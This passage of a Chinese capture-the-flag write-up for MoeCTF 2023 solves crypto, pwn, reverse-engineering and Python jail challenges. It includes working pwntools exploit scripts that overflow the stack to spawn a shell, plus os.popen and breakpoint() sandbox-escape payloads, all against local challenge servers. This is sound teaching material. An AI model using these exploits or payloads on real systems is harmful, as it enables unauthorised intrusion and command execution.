c_2 = 415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093
print(long_to_bytes(pow(c_2, d, n[2])).decode())

# moectf{it_is_re@lly_@_signin_level_cryPto_ch@ll@nge_ng92WPIBung92WPIBun}
```

### xorrrrrrrrr

```python
flag = open('flag.txt','rb').read()
assert flag.startswith(b'moectf{') and flag.endswith(b'}')
article = open('article.txt','rb').read()

import random

strxor = lambda x,y: bytes([a^b for a,b in zip(x,y)])

result = []

for i in range(100):
    range_start = random.randint(0, len(article) - len(flag))
    mask = article[range_start:range_start + len(flag)]
    result.append(strxor(flag,mask))

with open("result.log","w") as fs:
    fs.writelines([str(i)+"\n" for i in result])
```

`result.log` 的内容是通过从 `article.txt` 随机裁取 flag 长度的内容与 flag 进行异或的结果，一共循环 100 次也就是有 100 条异或结果。通过断言可以得到 flag 的前七个字节为 `moectf{` ，最后一个字节为 `}` 。因此通过将 `result.log` 每条的前七个字节与 `moectf{` 进行异或就可以获得 `article.txt` 中的 7 个字节，具体代码如下所示。

```python
with open('./moectf/result.log', 'r') as f:
    results = [eval(line.strip()) for line in f.readlines()]
    
keys = []

strxor = lambda x, y: bytes([a ^ b for a, b in zip(x, y)])

for result in results:
    keys.append(strxor(result[:7], "moectf{".encode()))
    
# keys = [b'mers wh', b'ractica', b'flow vu', b'citing ', b'are com', b'rs. You', ...]
```

由于 100 次循环中，每次裁取得地方不同，部分会包含 keys 得内容，那么我们就可以通过这个进行爆破 flag 得中间部分。

```python
count = {}

def is_printable(a_result):
    printable = lambda s: s in string.printable.replace("\t", "").replace("\n", "").replace("\x0b", "").replace("\x0c",
                                                                                                                "").replace(
        "\r", "").replace(" ", "").encode()
    return all([printable(c) for c in a_result])

index = {}

def all_possiable(result, key):
    for i in range(72 - 7):
        r = strxor(result[i + 7:i + 7 + 7], key)
        if is_printable(r):
            if r in count:
                count[r] = count[r] + 1
            else:
                count[r] = 1
            index[r] = i

for result in results:
    for key in keys:
        all_possiable(result, key)

for i in sorted(count.items(), key=lambda kv: (kv[1], kv[0]))[::-1][:1000]:
    if len(i[0]) == 7:
        print(i, index[i[0]])
```

通过 `is_printable()` 可以判断该字节是否为可打印字符，通过 `all_possiable()` 函数不断从每条得第八个字节开始进行每七个字节每七个字节得读取与 keys 中的内容进行异或处理，并且计算每个输出的个数判断频率。最后通过 `sorted()` 函数进行筛选并输出前 1000 个（如果不筛选的话有 27w 条），根据输出的内容进行拼接就可以得到 flag 了。

```python
(b'red_tHe', 20) 18
(b'_y0U_Ha', 20) 3
(b'_tHe_x0', 20) 21
(b'He_x0r_', 20) 23
(b'0Peart0', 20) 30
(b'ered_tH', 19) 17
(b'ed_tHe_', 19) 19
(b'_x0r_0P', 19) 25
(b'U_HaVe_', 19) 6
(b'0r_0Pea', 19) 27
(b'tHe_x0r', 18) 22
(b'JoxiMl}', 18) 58
(b'd_tHe_x', 17) 20
(b'3rux9G9', 16) 48
(b'0W_y0U_', 16) 1
(b'astered', 15) 14
(b'YlJf!M3', 15) 42
(b'0iYlJf!', 15) 40
(b'x0r_0Pe', 14) 26
(b'rt0r!_0', 14) 34
(b'f!JoxiM', 14) 56
(b'e_x0r_0', 14) 24
(b'r_0Pear', 13) 28
(b'mastere', 13) 13
(b'f!M3rux', 13) 45
(b'eart0r!', 13) 32
(b'_master', 13) 12
(b'_0Peart', 13) 29
(b'0U_HaVe', 13) 5
(b'!M3rux9', 13) 46
(b'ux9G9Vf', 12) 50
(b'stered_', 12) 15
(b'W0W_y0U', 12) 0
(b'HaVe_ma', 12) 8
(b'lJf!M3r', 11) 43
(b'art0r!_', 11) 33
(b'iYlJf!M', 10) 41
(b'Dh6>Lof', 10) 58
(b'!_0iYlJ', 10) 38
(b'y0U_HaV', 9) 4
(b'x9G9Vf!', 9) 51
(b't0r!_0i', 9) 35
(b'r!_0iYl', 9) 37
(b'e_maste', 9) 11
(b'aVe_mas', 9) 9
(b'Vf!Joxi', 9) 55
(b'Ve_mast', 9) 10
(b'M3rux9G', 9) 47
(b'0r!_0iY', 9) 36
(b'tered_t', 8) 16
(b'rux9G9V', 8) 49
(b'kf<#1q:', 8) 32
(b'Peart0r', 8) 31
(b'G9Vf!Jo', 8) 53
(b'_HaVe_m', 7) 7
(b'_0iYlJf', 7) 39
(b'9G9Vf!J', 7) 52
(b'~bejYmV', 6) 17
(b'~I-Mc|j', 6) 22
(b'}r$o^!R', 6) 17
(b'y=Xis$V', 6) 56
(b'tc-xB!N', 6) 17
(b'pe+=XnM', 6) 17
(b'XHG3P*@', 6) 6
(b'Wi!2l`d', 6) 14
(b'W_y0U_H', 6) 2
(b'Vq-Krsc', 6) 55
(b'Jf!M3ru', 6) 44
(b'ErP*6=@', 6) 23
(b'=u;/8D"', 6) 48
(b'=Gj3t;/', 6) 30
(b';Y0Zx2y', 6) 22
(b'2\\|3o<=', 6) 30
(b'1s0oYo]', 6) 17
(b'}\\)Db|q', 5) 22
(b'|o:xp_:', 5) 48
(b'|f;kpN#', 5) 48
(b'xR+Kt,j', 5) 22
(b'x0=GhV)', 5) 18
(b'wQeDt=l', 5) 22
(b're*L=Pa', 5) 18
(b'mb+OoEd', 5) 18
(b'kObFkh>', 5) 28
(b'k7=1D=h', 5) 35
(b'j~\\7F14', 5) 21
(b'jy(D=Hl', 5) 18
(b'i^80I@"', 5) 24
(b'h_#Cl$:', 5) 28
(b'gZFgyW]', 5) 1
(b'gYvgHC9', 5) 24
(b'gFtSiRf', 5) 20
(b"`f2'=`'", 5) 46
(b'\\d[7^/6', 5) 21
(b'[{&#{we', 5) 13
(b'WkVf&U*', 5) 42
(b'Wh=}Pnt', 5) 58
(b'Vc+jAmb', 5) 58
(b'V4xJLib', 5) 58
(b'LixuJof', 5) 58
(b'HzBvxNX', 5) 23
(b'CcFpC95', 5) 21
(b'?Ksais"', 5) 30
(b'=qbj/A=', 5) 34
(b';d*]1+w', 5) 22
(b"9',`%Yu", 5) 48
(b"3r'/?\\;", 5) 48
(b'3p9j4L0', 5) 48
(b"3j%z$N'", 5) 48
(b"0kuc5J'", 5) 48
(b"0f'/6^;", 5) 48
(b'+s;J,D}', 5) 20
(b'+Z&PkAu', 5) 20
(b'*w7|QjE', 5) 17
(b')sz|o:x', 5) 45
(b'"w<mjq|', 5) 13
(b'"M<v,i`', 5) 13
(b'!JoxiMl', 5) 57
(b'~twQ=Si', 4) 50
(b'~]h3hr2', 4) 30
(b'~Emahq}', 4) 11
(b'~6B-N+r', 4) 27
(b'~%X(s;c', 4) 45
(b'}utsum(', 4) 14
(b'}s+%dgD', 4) 15
(b'}oK*);[', 4) 23
(b'}hm=xeL', 4) 15
(b'}U,do=y', 4) 11
(b'}6ds>H3', 4) 48
(b'|~-]2,\\', 4) 36
(b'|uWkVf&', 4) 40
(b'|oZ&R-R', 4) 19
(b'|lkf<#1', 4) 30
(b"|hA{M|'", 4) 40
(b'|cyeu_v', 4) 16
(b'|ZD`0U_', 4) 1
(b"|Tjw<'7", 4) 30
(b'|SxJ(nR', 4) 41
(b'|Qqau:?', 4) 30
(b'|Qa"L8m', 4) 54
(b'|Me@kz?', 4) 9
(b'|L.+H}&', 4) 43
(b'|Fm~u89', 4) 30
```

最后拼出来的 flag 如下

```
moectf{W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl}
```

### giant\_e

> https://raw.githubusercontent.com/orisano/owiener/master/owiener.py

当 e 很大的时候，d 就挺小

```python
from Crypto.Util.number import long_to_bytes
import owiener
e = 0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43
c = 0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14
n = 0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239

d = owiener.attack(e, n)

print(long_to_bytes(pow(c, d, n)))
# moectf{too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP}
```

### ez\_chain

```python
def blockize(long):
    out = []
    while long > 0:
        out.append(long % base)
        long //= base
    return list(reversed(out))

blocks = blockize(m)
```

`blockize()` 函数会将传入的 long 值由十进制转换成 base 进制，在本题中 base 如下。

```python
base = bytes_to_long(b"koito") = 461430682735
```

通过以下题目内容

```python
assert len(flag) == 72
print(encrypt_block_cbc(blocks, iv, key))
# [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]
```

可以得知 flag 共 72 字符，转 base 进制后共 15 位，最高位是 $461430682735^{14}$ ，又因为 flag 的前七个字符为 `moectf{` ，通过以下代码

```python
first = "moectf{0}{1}{2}".format('{', '1' * 64, '}')
second = "moectf{0}{1}{2}".format('{', 'b' * 64, '}')
print("moectf{0}{1}{2}".format('{', '1' * 64, '}'))
print("moectf{0}{1}{2}".format('{', '5' * 64, '}'))
print(blockize(bytes_to_long(first.encode())))
print(blockize(bytes_to_long(second.encode())))
"""
[5329712293, 126494098340, 153597856955, 242892191641, 28680140924, 170513630989, 14482395232, 413336526109, 440072292209, 238157420150, 359568109605, 336722793770, 114932087705, 442402117522, 155888680347]
[5329712293, 126494113681, 412307442966, 223567461220, 265567505631, 283536975878, 441347697513, 92786431363, 341104088824, 89919877328, 103798180169, 361771096704, 429900835874, 213202888672, 337161076933]
"""
```

可以发现数组的第一个值都是 `5329712293` ，因此可以推断出 `blocks[0]` 的值就是 `5329712293` 。

又因为 $encrypted\[0] = blocks\[0],\oplus,iv,\oplus,key $ ，反推即可得到 $key = blocks\[0],\oplus,iv,\oplus,encrypted\[0] $ 。

通过上述式子就可以得到 key 值为 `421036458` ，实现代码如下。

```python
first = "moectf{0}{1}{2}".format('{', '1' * 64, '}')
iv = 3735927943
key = blockize(bytes_to_long(first.encode()))[0] ^ 8490961288 ^ iv
print(key) # 421036458
```

得到 key 后就可以通过 $blocks\[i] = encrypted\[i],\oplus,encrypted\[i-1],\oplus,key $ 一路逆推出整个 blocks 数组，最后再编写一个 base 进制转十进制的函数进行转换最后再用 `long_to_bytes()` 函数转就可以得到 flag 了，实现代码如下

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long

key = 421036458
iv = 3735927943
base = bytes_to_long(b"koito")

encrypted_blocks_with_iv = [
    3735927943, 8490961288, 122685644196, 349851982069, 319462619019,
    74697733110, 43107579733, 465430019828, 178715374673,
    425695308534, 164022852989, 435966065649, 222907886694,
    420391941825, 173833246025, 329708930734
]


def decrypt_block_cbc(key):
    decrypted = []
    for i in range(1, len(encrypted_blocks_with_iv)):
        decrypted_block = encrypted_blocks_with_iv[i] ^ encrypted_blocks_with_iv[i - 1] ^ key
        decrypted.append(decrypted_block)
    return decrypted


decrypted_blocks = decrypt_block_cbc(key)


def base_to_decimal(blocks, base):
    blocks_reversed = blocks[::-1]
    decimal_val = 0
    for i, block in enumerate(blocks_reversed):
        decimal_val += block * (base ** i)
    return decimal_val


flag = long_to_bytes(base_to_decimal(decrypted_blocks, base))
print(flag)
# b'moectf{thE_c6c_Is_not_so_hard_9ifxi9i!JGofMJ36D9cPMxroif6!M6oSMuliPPcA3}'
```

## Pwn

### 入门指北

moectf{M4ke\_A\_Promi5e\_7hat\_1\_C4nn0t\_Re9ret}

### test\_nc

```bash
$ nc localhost 44085
Oh, welcome here. Here is a shell for you.
ls -la
total 92
drwxr-x--- 1 0 1000  4096 Aug 14 09:58 .
drwxr-x--- 1 0 1000  4096 Aug 14 09:58 ..
-rwxr-x--- 1 0 1000   220 Feb 25  2020 .bash_logout
-rwxr-x--- 1 0 1000  3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 0    0    41 Aug 14 09:58 .flag
-rwxr-x--- 1 0 1000   807 Feb 25  2020 .profile
drwxr-x--- 1 0 1000  4096 Aug  8 04:20 bin
drwxr-x--- 1 0 1000  4096 Aug  8 04:20 dev
-rw-r--r-- 1 0    0    31 Aug 14 09:58 gift
drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib
drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib32
drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib64
drwxr-x--- 1 0 1000  4096 Apr 29 13:36 libx32
-rwxr-x--- 1 0 1000 19656 Aug  8 04:19 test_nc
cat .flag
moectf{8Z3WdoCA1yTVggZE5mquNP-8nOqQKUAM}
```

### baby\_calculator

```python
import re

from pwnlib.tubes.remote import remote

io = remote("127.0.0.1", 45499)
ret = io.recvline()

count = 0

while 1:
    print(ret)
    if count == 100:
        print(io.recvall())
        break
    if b"=" in ret:
        status = eval(re.sub("=", "==", ret.decode()))
        if status:
            print("BlackBird")
            count += 1
            io.sendline(b"BlackBird")
            ret = io.recvline()
        else:
            print("WingS")
            count += 1
            io.sendline(b"WingS")
            ret = io.recvline()
    else:
        ret = io.recvline()

# moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????}
```

### fd

反编译可以得到以下内容

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int input; // [rsp+4h] [rbp-6Ch] BYREF
  int fd; // [rsp+8h] [rbp-68h]
  int new_fd; // [rsp+Ch] [rbp-64h]
  char flag[80]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  input = 0;
  init();
  puts("Do you know fd?");
  fd = open("./flag", 0, 0LL);
  new_fd = (4 * fd) | 0x29A;
  dup2(fd, new_fd);
  close(fd);
  puts("Which file do you want to read?");
  puts("Please input its fd: ");
  __isoc99_scanf("%d", &input);
  read(input, flag, 0x50uLL);
  puts(flag);
  return 0;
}
```

`fd` 的值通常从3开始（0, 1, 2通常是标准输入、输出、错误）

```python
fd = 3
new_fd = (4 * fd) | 0x29A
print(new_fd)
# 670
```

输入 `670` 后即可得到 flag 如下

```
moectf{3NweDualuBwfyp6GlkyYbwJIExehrO5q}
```

### int\_overflow

反编译可以得到以下内容

```c
void __cdecl vuln()
{
  int n; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("Welcome to Moectf2023.");
  puts("Do you know int overflow?");
  puts("Can you make n == -114514 but no '-' when you input n.");
  puts("Please input n:");
  get_input(&n);
  if ( n == -114514 )
    backdoor();
  puts("Maybe you should search and learn it.");
}
```

通过计算可以得到 `-114514` 的补码为 `4294852782` ，通过输入后交互即可得到 flag 如下

```
moectf{DE9AMxUIxA7q0JTWqPK_cg-yyklcF71U}
```

### ret2text\_32

> Desc：一道最基础的32位栈溢出题OvO

下载附件使用 IDA 打开后对 main 进行反编译可以得到以下内容

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vuln();
  return 0;
}

ssize_t vuln()
{
  size_t nbytes; // [esp+Ch] [ebp-5Ch] BYREF
  char buf[84]; // [esp+10h] [ebp-58h] BYREF

  puts("Welcome to my stack in MoeCTF2023!");
  puts("What's your age?");
  __isoc99_scanf("%d", &nbytes);
  puts("Now..try to overflow!");
  return read(0, buf, nbytes);
}
```

通过查看 vuln 函数的栈如下

```
-00000068 db ? ; undefined
-00000067 db ? ; undefined
-00000066 db ? ; undefined
-00000065 db ? ; undefined
-00000064 db ? ; undefined
-00000063 db ? ; undefined
-00000062 db ? ; undefined
-00000061 db ? ; undefined
-00000060 db ? ; undefined
-0000005F db ? ; undefined
-0000005E db ? ; undefined
-0000005D db ? ; undefined
-0000005C nbytes dd ?
-00000058 buf db 84 dup(?)
-00000004 var_4 dd ?
+00000000  s db 4 dup(?)
+00000004  r db 4 dup(?)
```

因此需要用其他字符填充满 0x58+0x4 ，然后开始找地址。

> https://blog.csdn.net/Morphy\_Amo/article/details/121757953?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D
>
> 第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址
>
> ```python
> system_addr = 0x08048320
> binsh_addr = 0x0804a024
> payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(0)  + p32(binsh_addr)
> ```
>
> 第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址
>
> ```python
> system_addr = 0x08048320
> binsh_addr = 0x0804a024
> payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(binsh_addr)
> ```

<figure><img src=".gitbook/assets/ret2text_32-1.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/ret2text_32-2.png" alt=""><figcaption></figcaption></figure>

通过查找可以找到 call system 的地址 `0x080492A9` 还有 /bin/sh 的地址 `0x0804C02C` ，寻找过程中可以使用 `Shift+F12` 通过 Strings 来找挺方便。

<figure><img src=".gitbook/assets/ret2text_32-3.png" alt=""><figcaption></figcaption></figure>

找出地址后就开始写脚本力，如下

```python
from pwn import *

sh = remote('localhost', 42107)

sh.sendline(b'999')
backdoor_addr = 0x804928c
system_addr = 0x080492A9
binsh_addr = 0x0804C02C

payload = b'a' * (0x58 + 0x4) + p32(system_addr) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

`nbytes` 参数表示要读取的最大字节数，设置大点就行，然后通过栈溢出就能得到 sh 了。

之后就是通过 `ls` 和 `cat` 来获取 flag 了，过程如下

```python
[x] Opening connection to localhost on port 42107
[x] Opening connection to localhost on port 42107: Trying ::1
[x] Opening connection to localhost on port 42107: Trying 127.0.0.1
[+] Opening connection to localhost on port 42107: Done
[*] Switching to interactive mode
Welcome to my stack in MoeCTF2023!
What's your age?
Now..try to overflow!
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat /flag
moectf{9-BDI0PdSAud86ZZ2ygFIbDZQp2Bzxrz}
```

### ret2text\_64

> https://xz.aliyun.com/t/12645

这道题的原理是通过覆盖函数的返回地址，通过 `pop rdi; ret` 可以将栈顶的值弹出到寄存器 `rdi` 中，并跳转到返回地址 `system_addr` ，以 `rdi` 寄存器的内容作为参数执行恶意命令。

下载附件使用 IDA 打开后对 main 进行反编译可以得到以下内容

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}

ssize_t vuln()
{
  int v1; // [rsp+Ch] [rbp-54h] BYREF
  char buf[80]; // [rsp+10h] [rbp-50h] BYREF

  puts("Welcome to my stack in MoeCTF2023!");
  puts("But this time..you need to find the point to get it!");
  puts("What's your age?");
  __isoc99_scanf("%d", &v1);
  puts("Now..try to overflow!");
  return read(0, buf, v1);
}
```

通过查看 vuln 函数的栈如下

```
-0000000000000060 db ? ; undefined
-000000000000005F db ? ; undefined
-000000000000005E db ? ; undefined
-000000000000005D db ? ; undefined
-000000000000005C db ? ; undefined
-000000000000005B db ? ; undefined
-000000000000005A db ? ; undefined
-0000000000000059 db ? ; undefined
-0000000000000058 db ? ; undefined
-0000000000000057 db ? ; undefined
-0000000000000056 db ? ; undefined
-0000000000000055 db ? ; undefined
-0000000000000054 var_54 dd ?
-0000000000000050 buf db 80 dup(?)
+0000000000000000  s db 8 dup(?)
+0000000000000008  r db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

可以得出需要覆盖 `0x50+0x8` 的地址，并且通过 IDA 可以得到以下信息（通过 Functions 和 Strings）

```python
backdoor_addr = 0x00000000004012A5
system_addr = 0x00000000004012B7
binsh_addr = 0x0000000000404050
```

通过以下命令可以得到 `pop rdi ; ret` 的地址

```bash
$ ROPgadget --binary "pwn" --only "pop|ret"
Gadgets information
============================================================
0x000000000040119d : pop rbp ; ret
0x00000000004011be : pop rdi ; ret
0x000000000040101a : ret
```

通过编写以下脚本即可执行获得 Shell

```python
from pwn import *

sh = remote('localhost', 36289)

sh.sendline(b'999')
backdoor_addr = 0x00000000004012A5
system_addr = 0x00000000004012B7
binsh_addr = 0x0000000000404050
pop_rdi_ret_addr = 0x00000000004011be

payload = b'a' * (0x58) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
sh.sendline(payload)
sh.interactive()
"""
[x] Opening connection to localhost on port 36289: Trying 127.0.0.1
[+] Opening connection to localhost on port 36289: Done
[*] Switching to interactive mode
Welcome to my stack in MoeCTF2023!
But this time..you need to find the point to get it!
What's your age?
Now..try to overflow!
cat /flag
moectf{tCyXQ6HLJk83Iutmn5MVW2x0h-6ZF7p3}
"""
```

## Reverse

### 入门指北

使用 IDA 打开即可得到 flag

moectf{F1rst\_St3p\_1s\_D0ne}

### base\_64

> https://tool.lu/pyc/

先进行反编译，反编译后得到以下代码

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.7

import base64
from string import *
str1 = 'yD9oB3Inv3YAB19YynIuJnUaAGB0um0='
string1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/'
string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
flag = input('welcome to moectf\ninput your flag and I wiil check it:')
enc_flag = base64.b64encode(flag.encode()).decode()
enc_flag = enc_flag.translate(str.maketrans(string2, string1))
if enc_flag == str1:
    print('good job!!!!')
else:
    print('something wrong???')
    exit(0)
```

将 `str1` 放入 CyberChef 并修改字符集 `string1` 即可得到 flag `moectf{pYc_And_Base64~}`。

### Xor

用 IDA 打开点击 `main` 按 `F5` ，双点 `enc` 可以得到 `enc` 的内容如下

```python
enc = [0x54, 0x56, 0x5C, 0x5A, 0x4D, 0x5F, 0x42, 0x60, 0x56, 0x4C, 0x66, 0x52, 0x57, 0x09, 0x4E, 0x66, 0x51, 0x09, 0x4E, 0x66, 0x4D, 0x09, 0x66, 0x61, 0x09, 0x6B, 0x18, 0x44]
```

通过分析 `main` 函数可以得知将 `enc` 的每个与 `0x39` 进行异或即可得到 flag，编写脚本如下

```python
enc = [0x54, 0x56, 0x5C, 0x5A, 0x4D, 0x5F, 0x42, 0x60, 0x56, 0x4C, 0x66, 0x52, 0x57, 0x09, 0x4E, 0x66, 0x51, 0x09, 0x4E, 0x66, 0x4D, 0x09, 0x66, 0x61, 0x09, 0x6B, 0x18, 0x44]
for i in enc:
    print(chr(i ^ 0x39), end='')
# moectf{You_kn0w_h0w_t0_X0R!}
```

### UPX!

```bash
$ upx 1.exe -d
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   1263104 <-    270336   21.40%    win64/pe     1.exe

Unpacked 1 file.
```

用 IDA 打开后对着 `Functions` 按 `Shift+F12` ，可以找到以下内容

<figure><img src=".gitbook/assets/UPX!-1.png" alt=""><figcaption></figcaption></figure>

通过点击 `welcome to moectf` 并进行反编译可以得到以下内容

```c
__int64 sub_140079760()
{
  char *v0; // rdi
  __int64 i; // rcx
  unsigned __int64 v2; // rax
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF
  char v5; // [rsp+20h] [rbp+0h] BYREF
  char v6[76]; // [rsp+28h] [rbp+8h] BYREF
  int j; // [rsp+74h] [rbp+54h]
  unsigned __int64 v8; // [rsp+148h] [rbp+128h]

  v0 = &v5;
  for ( i = 34i64; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  sub_140075557(&unk_1401A7008);
  sub_140073581("welcome to moectf");
  sub_140073581("I put a shell on my program to prevent you from reversing it, you will never be able to reverse it hhhh~~");
  sub_140073581("Now tell me your flag:");
  memset(v6, 0, 0x2Aui64);
  sub_1400727F8("%s", v6);
  for ( j = 0; ; ++j )
  {
    v8 = j;
    v2 = sub_140073829((__int64)v6);
    if ( v8 >= v2 )
      break;
    v6[j] ^= 0x67u;
    if ( word_140196000[j] != v6[j] )
    {
      sub_140073973("try again~~");
      sub_1400723F7(0i64);
    }
  }
  sub_140073973("you are so clever!");
  sub_140074BCF(v4, &unk_140162070);
  return 0i64;
}
```

在 `word_140196000` 可以找到 enc ，对 enc 异或 `0x67` 再转字符串就可以得到 flag 了。

```python
enc = [0x0A, 0x08, 0x02, 0x04, 0x13, 0x01, 0x1C, 0x57, 0x0F, 0x38, 0x1E, 0x57, 0x12, 0x38, 0x2C, 0x09, 0x57, 0x10, 0x38, 0x2F, 0x57, 0x10, 0x38, 0x13, 0x08, 0x38, 0x35, 0x02, 0x11, 0x54, 0x15, 0x14, 0x02, 0x38, 0x32, 0x37, 0x3F, 0x46, 0x46, 0x46, 0x1A]
for i in enc:
    print(chr(i ^ 0x67), end='')
# moectf{0h_y0u_Kn0w_H0w_to_Rev3rse_UPX!!!}
```

## AI

### EZ MLP

矩阵乘法不满足交换律，改变矩阵乘法顺序即可，即将下述函数

```python
def fc(x, weight, bias):
    return np.matmul(x, weight) + bias
```

修改成

```python
def fc(x, weight, bias):
    return np.matmul(weight, x) + bias
```

即可得到 flag 如下

```
moectf{fR13NdsHlP_15_M491C!}
```

## Jail

### Jail Level 0

Payload 如下。

```python
__import__('os').popen("ls").read()
__import__('os').popen("cat flag").read()
```

### Jail Level 1

```bash
$ nc localhost 38223

  __  __  ___        _____        _        _                _                         _                _ __ 
 |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | /_ |
 | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| || |
 | |\/| | | | |/ _ \ |    / / _` | |/ __| | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ || |
 | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ || |
 |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_||_|
                           \____/                      __/ |                                                
                                                      |___/                                                 
                                   

| Options: 
|       [G]et Challenge Source Code 
|       [E]nter into Challenge 
|       [C]hallenge Description 
|       [Q]uit 

>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) n
Answer result: None
> /home/ctf/server.py(57)<module>()->None
-> while(1):
(Pdb) step
> /home/ctf/server.py(58)<module>()->None
-> choice = input(">>> ").lower().strip()
(Pdb) step
>>> e
--Call--
> /usr/lib/python3.10/codecs.py(319)decode()
-> def decode(self, input, final=False):
(Pdb) n
> /usr/lib/python3.10/codecs.py(321)decode()
-> data = self.buffer + input
(Pdb) n
> /usr/lib/python3.10/codecs.py(322)decode()
-> (result, consumed) = self._buffer_decode(data, self.errors, final)
(Pdb) n
> /usr/lib/python3.10/codecs.py(324)decode()
-> self.buffer = data[consumed:]
(Pdb) n
> /usr/lib/python3.10/codecs.py(325)decode()
-> return result
(Pdb) n
--Return--
> /usr/lib/python3.10/codecs.py(325)decode()->'e\n'
-> return result
(Pdb) n
> /home/ctf/server.py(59)<module>()->None
-> if choice == 'g':
(Pdb) n
> /home/ctf/server.py(61)<module>()->None
-> elif choice == 'e':
(Pdb) n
> /home/ctf/server.py(62)<module>()->None
-> print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
(Pdb) n
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
> /home/ctf/server.py(63)<module>()->None
-> print("Enter your expression and I will evaluate it for you.")
(Pdb) n
Enter your expression and I will evaluate it for you.
> /home/ctf/server.py(64)<module>()->None
-> user_input_data = input("> ")
(Pdb) n
> 123
> /home/ctf/server.py(65)<module>()->None
-> if len(user_input_data)>12:
(Pdb) n
> /home/ctf/server.py(68)<module>()->None
